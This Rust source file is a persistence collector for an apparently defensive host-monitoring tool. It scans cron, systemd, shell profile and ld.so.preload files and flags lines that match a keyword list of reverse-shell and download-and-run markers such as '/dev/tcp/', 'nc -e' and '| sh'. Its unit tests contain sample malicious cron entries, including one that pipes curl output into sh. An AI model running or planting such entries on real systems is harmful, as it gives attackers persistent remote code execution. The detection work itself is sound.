use crate::collectors::{CollectContext, Collector};
use crate::utils::fs::{hash_file_limited, path_string};
use async_trait::async_trait;
use sentinel_core::{RawEvent, SentinelResult};
use std::fs;
use std::path::{Path, PathBuf};
use walkdir::WalkDir;

pub struct PersistenceCollector;

#[async_trait]
impl Collector for PersistenceCollector {
    fn name(&self) -> &'static str {
        "persistence"
    }

    async fn collect(&self, ctx: &CollectContext) -> SentinelResult<Vec<RawEvent>> {
        if !ctx.config.persistence.enabled {
            return Ok(Vec::new());
        }

        let mut events = Vec::new();
        if ctx.config.persistence.monitor_cron {
            collect_files(ctx, cron_paths(), "cron", &mut events);
        }
        if ctx.config.persistence.monitor_systemd {
            collect_files(ctx, systemd_paths(), "systemd", &mut events);
        }
        if ctx.config.persistence.monitor_shell_profile {
            collect_files(ctx, shell_profile_paths(), "shell_profile", &mut events);
        }
        if ctx.config.persistence.monitor_ld_preload {
            collect_files(
                ctx,
                vec![PathBuf::from("/etc/ld.so.preload")],
                "ld_preload",
                &mut events,
            );
        }
        Ok(events)
    }
}

fn collect_files(
    ctx: &CollectContext,
    paths: Vec<PathBuf>,
    persistence_type: &str,
    events: &mut Vec<RawEvent>,
) {
    for configured in paths {
        let path = ctx.resolve(&configured);
        if !path.exists() {
            continue;
        }
        if path.is_file() {
            collect_file(&path, persistence_type, events);
        } else if path.is_dir() {
            for entry in WalkDir::new(&path)
                .max_depth(2)
                .into_iter()
                .filter_map(Result::ok)
            {
                if entry.file_type().is_file() {
                    collect_file(entry.path(), persistence_type, events);
                }
            }
        }
    }
}

fn collect_file(path: &Path, persistence_type: &str, events: &mut Vec<RawEvent>) {
    let hash = hash_file_limited(path, 1024 * 1024)
        .ok()
        .flatten()
        .unwrap_or_else(|| "too_large".to_string());
    let content = fs::read_to_string(path).unwrap_or_default();
    let suspicious_lines = content
        .lines()
        .filter(|line| !line.trim_start().starts_with('#'))
        .filter(|line| is_persistence_command_candidate(line))
        .take(5)
        .collect::<Vec<_>>()
        .join("\n");
    events.push(
        RawEvent::new("persistence", "persistence_entry")
            .with_field("type", persistence_type)
            .with_field("path", path_string(path))
            .with_field("hash", hash)
            .with_field("suspicious_lines", suspicious_lines),
    );
}

fn cron_paths() -> Vec<PathBuf> {
    vec![
        PathBuf::from("/etc/crontab"),
        PathBuf::from("/etc/cron.d"),
        PathBuf::from("/etc/cron.hourly"),
        PathBuf::from("/etc/cron.daily"),
        PathBuf::from("/var/spool/cron"),
    ]
}

fn systemd_paths() -> Vec<PathBuf> {
    vec![
        PathBuf::from("/etc/systemd/system"),
        PathBuf::from("/lib/systemd/system"),
        PathBuf::from("/usr/lib/systemd/system"),
    ]
}

fn shell_profile_paths() -> Vec<PathBuf> {
    vec![
        PathBuf::from("/etc/profile"),
        PathBuf::from("/etc/profile.d"),
        PathBuf::from("/etc/bash.bashrc"),
    ]
}

/// Candidate persistence command fragments that deserve detector-side scoring.
pub fn is_persistence_command_candidate(line: &str) -> bool {
    let lowered = line.to_ascii_lowercase();
    [
        "/tmp/",
        "/var/tmp/",
        "/dev/shm/",
        "curl ",
        "wget ",
        "| sh",
        "| bash",
        "bash -c",
        "base64",
        "/dev/tcp/",
        "nc -e",
        "socat",
    ]
    .iter()
    .any(|marker| lowered.contains(marker))
}

#[cfg(test)]
mod tests {
    use super::is_persistence_command_candidate;

    #[test]
    fn identifies_persistence_command_candidates() {
        assert!(is_persistence_command_candidate(
            "* * * * * curl http://x | sh"
        ));
        assert!(is_persistence_command_candidate("@reboot /dev/shm/.x"));
        assert!(is_persistence_command_candidate(
            "ExecStart=/bin/bash -c 'read args <&3; echo args=$args'"
        ));
        assert!(!is_persistence_command_candidate(
            "0 1 * * * /usr/bin/certbot renew"
        ));
    }
}
